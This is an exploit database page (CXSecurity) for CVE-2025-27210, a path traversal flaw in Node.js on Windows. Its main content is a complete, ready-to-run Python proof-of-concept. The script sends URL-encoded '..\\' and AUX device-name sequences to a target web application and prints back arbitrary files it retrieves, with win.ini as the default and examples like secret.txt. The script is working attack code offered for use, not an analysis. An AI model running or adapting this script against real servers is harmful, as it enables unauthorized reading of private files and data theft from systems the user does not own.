---
title: NodeJS 24.x Path Traversal
url: https://cxsecurity.com/issue/WLB-2025070023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-07-18
fetch_date: 2025-10-06T23:16:42.688178
---

# NodeJS 24.x Path Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NodeJS 24.x Path Traversal** **2025.07.17**  Credit:  **[Abdualhadi khalifa](https://cxsecurity.com/author/Abdualhadi%2Bkhalifa/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-27210](https://cxsecurity.com/cveshow/CVE-2025-27210/ "Click to see CVE-2025-27210")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

# Exploit Title : NodeJS 24.x - Path Traversal
# Exploit Author : Abdualhadi khalifa
# CVE : CVE-2025-27210
import argparse
import requests
import urllib.parse
import json
import sys
def exploit\_path\_traversal\_precise(target\_url: str, target\_file: str, method: str) -> dict:
traverse\_sequence = "..\\" \* 6
normalized\_target\_file = target\_file.replace("C:", "").lstrip("\\/")
malicious\_path = f"{traverse\_sequence}AUX\\..\\{normalized\_target\_file}"
encoded\_malicious\_path = urllib.parse.quote(malicious\_path, safe='')
full\_url = f"{target\_url}/{encoded\_malicious\_path}"
response\_data = {
"target\_url": target\_url,
"target\_file\_attempted": target\_file,
"malicious\_path\_sent\_raw": malicious\_path,
"malicious\_path\_sent\_encoded": encoded\_malicious\_path,
"full\_request\_url": full\_url,
"http\_method": method,
"success": False,
"response\_status\_code": None,
"response\_content\_length": None,
"extracted\_content": None,
"error\_message": None
}
try:
print(f"[\*] Preparing precise Path Traversal exploit...")
print(f"[\*] Malicious Path (Encoded): {encoded\_malicious\_path}")
print(f"[\*] Request URL: {full\_url}")
if method.upper() == 'GET':
response = requests.get(full\_url, timeout=15)
elif method.upper() == 'POST':
response = requests.post(f"{target\_url}", params={'filename': encoded\_malicious\_path}, timeout=15)
else:
raise ValueError("Unsupported HTTP method. Use 'GET' or 'POST'.")
response\_data["response\_status\_code"] = response.status\_code
response\_data["response\_content\_length"] = len(response.content)
if response.status\_code == 200:
content = response.text
response\_data["extracted\_content"] = content
if target\_file.lower().endswith("win.ini") and "[windows]" in content.lower():
response\_data["success"] = True
elif len(content) > 0: # For any other file, just check for non-empty content.
response\_data["success"] = True
else:
response\_data["error\_message"] = "Received 200 OK, but content is empty or unexpected."
else:
response\_data["error\_message"] = f"Server responded with non-200 status code: {response.status\_code}"
except requests.exceptions.Timeout:
response\_data["error\_message"] = "Request timed out. Server might be slow or unresponsive."
except requests.exceptions.ConnectionError:
response\_data["error\_message"] = "Connection failed to target. Ensure the Node.js application is running and accessible."
except ValueError as ve:
response\_data["error\_message"] = str(ve)
except Exception as e:
response\_data["error\_message"] = f"An unexpected error occurred: {str(e)}"
return response\_data
def main():
parser = argparse.ArgumentParser(
prog="CVE-2025-27210\_NodeJS\_Path\_Traversal\_Exploiter.py",
description="""
Proof of Concept (PoC) for a precise Path Traversal vulnerability in Node.js on Windows (CVE-2025-27210).
This script leverages how Node.js functions (like path.normalize() or path.join())
might mishandle reserved Windows device file names (e.g., CON, AUX) within Path Traversal
sequences.
""",
formatter\_class=argparse.RawTextHelpFormatter
)
parser.add\_argument(
"-t", "--target",
type=str,
required=True,
help="Base URL of the vulnerable Node.js application endpoint (e.g., http://localhost:3000/files)."
)
parser.add\_argument(
"-f", "--file",
type=str,
default="C:\\Windows\\win.ini",
help="""Absolute path to the target file on the Windows system.
Examples: C:\\Windows\\win.ini, C:\\secret.txt, C:\\Users\\Public\\Documents\\important.docx
"""
)
parser.add\_argument(
"-m", "--method",
type=str,
choices=["GET", "POST"],
default="GET",
help="HTTP method for the request ('GET' or 'POST')."
)
args = parser.parse\_args()
# --- CLI Output Formatting ---
print("\n" + "="\*70)
print(" CVE-2025-27210 Node.js Path Traversal Exploit PoC")
print("="\*70)
print(f"[\*] Target URL: {args.target}")
print(f"[\*] Target File: {args.file}")
print(f"[\*] HTTP Method: {args.method}")
print("-"\*70 + "\n")
result = exploit\_path\_traversal\_precise(args.target, args.file, args.method)
print("\n" + "-"\*70)
print(" Exploit Results")
print("-"\*70)
print(f" Request URL: {result['full\_request\_url']}")
print(f" Malicious Path Sent (Raw): {result['malicious\_path\_sent\_raw']}")
print(f" Malicious Path Sent (Encoded): {result['malicious\_path\_sent\_encoded']}")
print(f" Response Status Code: {result['response\_status\_code']}")
print(f" Response Content Length: {result['response\_content\_length']} bytes")
if result["success"]:
print("\n [+] File successfully retrieved! Content below:")
print(" " + "="\*66)
print(result["extracted\_content"])
print(" " + "="\*66)
else:
print("\n [-] File retrieval failed or unexpected content received.")
if result["error\_message"]:
print(f" Error: {result['error\_message']}")
elif result["extracted\_content"]:
print("\n Response content (partial, may indicate server error or unexpected data):")
print(" " + "-"\*66)
# Truncate long content if not fully successful
print(result["extracted\_content"][:1000] + "..." if len(result["extracted\_content"]) > 1000 else result["extracted\_content"])
print(" " + "-"\*66)
print("\n" + "="\*70)
print(" Complete")
print("="\*70 + "\n")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025070023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

--...